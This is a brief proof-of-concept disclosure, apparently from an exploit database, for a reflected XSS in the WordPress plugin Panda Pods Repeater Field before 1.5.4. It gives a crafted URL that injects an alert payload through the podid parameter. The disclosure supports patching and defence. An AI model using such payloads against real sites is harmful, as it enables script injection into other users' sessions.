# Panda Pods Repeater Field < 1.5.4 - Reflected XSS

2. Install the vulnerable plugin (panda-pods-repeater-field) - https://wordpress.org/plugins/panda-pods-repeater-field (v1.5.3)
3. As an authenticated user, visit the following URL to trigger an alert box:
http://example.com/wp-content/plugins/panda-pods-repeater-field/fields/pandarepeaterfield.php?itemid=1&podid=1);%20alert(/xss/);/\*x&iframe\_id=panda-repeater-add-new&success=1
